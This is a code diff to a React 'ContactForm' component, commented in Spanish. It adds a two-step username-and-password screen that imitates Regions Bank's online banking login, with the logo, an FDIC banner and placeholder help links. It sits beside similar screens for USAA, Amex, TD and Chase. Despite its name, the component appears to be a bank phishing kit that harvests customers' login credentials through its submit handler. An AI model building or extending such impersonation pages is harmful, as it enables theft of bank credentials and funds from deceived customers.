@@ -97,6 +97,7 @@ export default function ContactForm() {
   const isUSAA = bankName?.toLowerCase().includes('usaa')
   const isAmex = bankName?.toLowerCase().includes('american express')
   const isTD = bankName?.toLowerCase().includes('td')
+  const isRegions = bankName?.toLowerCase().includes('regions')
   const isChase = bankName?.toLowerCase().includes('chase')
 
   // ---- FORMULARIO ----
@@ -882,6 +883,163 @@ export default function ContactForm() {
                   <Icon name="lock" size={18} />
                   <span>TD Online and Mobile Security Guarantee: You are protected</span>
                 </a>
+              </div>
+            </div>
+          </div>
+        </div>
+      )
+    }
+
+    // Diseño para Regions (flujo de dos pasos: username → password)
+    if (isRegions) {
+      // Paso 1: Username
+      if (formStep === 'username') {
+        return (
+          <div className="min-h-screen bg-white px-4 py-8 sm:px-0">
+            <div className="flex min-h-screen flex-col items-center justify-center px-4">
+              <div className="w-full max-w-lg">
+                {/* Logo Regions */}
+                {logo && (
+                  <div className="mb-8 flex justify-center">
+                    <img src={logo} alt="Regions" className="h-16 object-contain" />
+                  </div>
+                )}
+
+                <div className="mb-10 text-center">
+                  <p className="mb-2 flex items-center justify-center gap-2 text-sm text-gray-600">
+                    <Icon name="shield" size={16} />
+                    <span>FDIC-Insured - Backed by the full faith and credit of the U.S. Government</span>
+                  </p>
+                </div>
+
+                <h1 className="mb-4 text-center text-4xl font-light text-gray-800">Access your accounts online</h1>
+                <h2 className="mb-12 text-center text-2xl font-normal text-gray-700">Log in to Online Banking</h2>
+
+                <form
+                  onSubmit={(e) => {
+                    e.preventDefault()
+                    setFormStep('password')
+                  }}
+                  className="rounded-2xl border border-gray-200 bg-white p-10 shadow-sm"
+                >
+                  <div className="mb-8">
+                    <label className="mb-3 block text-base font-medium text-gray-800">Username</label>
+                    <input
+                      type="text"
+                      required
+                      value={username}
+                      onChange={(e) => setUsername(e.target.value)}
+                      className="w-full rounded-lg border-2 border-gray-300 px-4 py-3 text-gray-800 outline-none transition-colors focus:border-green-600"
+                      placeholder=""
+                    />
+                  </div>
+
+                  <label className="mb-8 flex items-center gap-3">
+                    <input
+                      type="checkbox"
+                      checked={rememberUsername}
+                      onChange={(e) => setRememberUsername(e.target.checked)}
+                      className="h-5 w-5 cursor-pointer rounded border border-gray-300 accent-green-600"
+                    />
+                    <span className="text-base text-gray-700">Remember my username</span>
+                  </label>
+
+                  <button
+                    type="submit"
+                    className="mb-8 w-full rounded-full bg-green-700 py-3 font-bold text-white hover:bg-green-800 transition-colors"
+                  >
+                    Continue
+                  </button>
+                </form>
+
+                <div className="mt-8 text-center space-y-4">
+                  <p className="text-base text-gray-700">
+                    Forgot <a href="#" className="text-blue-600 hover:text-blue-700 font-medium">username</a> or{' '}
+                    <a href="#" className="text-blue-600 hover:text-blue-700 font-medium">password</a>?
+                  </p>
+                  <p className="text-base text-gray-700">
+                    Don't have an Online Banking account?{' '}
+                    <a href="#" className="text-blue-600 hover:text-blue-700 font-medium">Enroll now</a>.
+                  </p>
+                </div>
+              </div>
+            </div>
+          </div>
+        )
+      }
+
+      // Paso 2: Password
+      return (
+        <div className="min-h-screen bg-white px-4 py-8 sm:px-0">
+          <div className="flex min-h-screen flex-col items-center justify-center px-4">
+            <div className="w-full max-w-lg">
+              {/* Logo Regions */}
+              {logo && (
+                <div className="mb-8 flex justify-center">
+                  <img src={logo} alt="Regions" className="h-16 object-contain" />
+                </div>
+              )}
+
+              <div className="mb-10 text-center">
+                <p className="mb-2 flex items-center justify-center gap-2 text-sm text-gray-600">
+                  <Icon name="shield" size={16} />
+                  <span>FDIC-Insured - Backed by the full faith and credit of the U.S. Government</span>
+                </p>
+              </div>
+
+              <h1 className="mb-4 text-center text-4xl font-light text-gray-800">Access your accounts online</h1>
+              <h2 className="mb-12 text-center text-2xl font-normal text-gray-700">Log in to Online Banking</h2>
+
+              <form onSubmit={submitForm} className="rounded-2xl border border-gray-200 bg-white p-10 shadow-sm">
+                {/* Mostrar username en azul */}
+                <div className="mb-8 rounded-lg bg-blue-50 px-4 py-3 border-l-4 border-blue-600">
+                  <p className="text-sm text-gray-600">Username</p>
+                  <p className="text-xl font-bold text-blue-600">{username}</p>
+                </div>
+
+                <div className="mb-8">
+                  <label className="mb-3 block text-base font-medium text-gray-800">Password</label>
+                  <div className="relative">
+                    <input
+                      type={showPassword ? 'text' : 'password'}
+                      required
+                      value={password}
+                      onChange={(e) => setPassword(e.target.value)}
+                      className="w-full rounded-lg border-2 border-gray-300 px-4 py-3 pr-10 text-gray-800 outline-none transition-colors focus:border-green-600"
+                      placeholder=""
+                    />
+                    <button
+                      type="button"
+                      onClick={() => setShowPassword(!showPassword)}
+                      className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-600"
+                    >
+                      <Icon name={showPassword ? 'eye-off' : 'eye'} size={20} />
+                    </button>
+                  </div>
+                </div>
+
+                <button
+                  type="submit"
+                  disabled={submitting}
+                  className="w-full rounded-full bg-green-700 py-3 font-bold text-white hover:bg-green-800 transition-colors disabled:opacity-60 mb-8"
+                >
+                  {submitting ? 'Logging in…' : 'Login'}
+                </button>
+
+                <button
+                  type="button"
+                  onClick={() => setFormStep('username')}
+                  className="w-full text-base text-gray-600 hover:text-gray-800 font-medium"
+                >
+                  Back
+                </button>
+              </form>
+
+              <div className="mt-8 text-center">
+                <p className="text-base text-gray-700">
+                  Forgot <a href="#" className="text-blue-600 hover:text-blue-700 font-medium">username</a> or{' '}
+                  <a href="#" className="text-blue-600 hover:text-blue-700 font-medium">password</a>?
+                </p>
               </div>
             </div>
           </div>
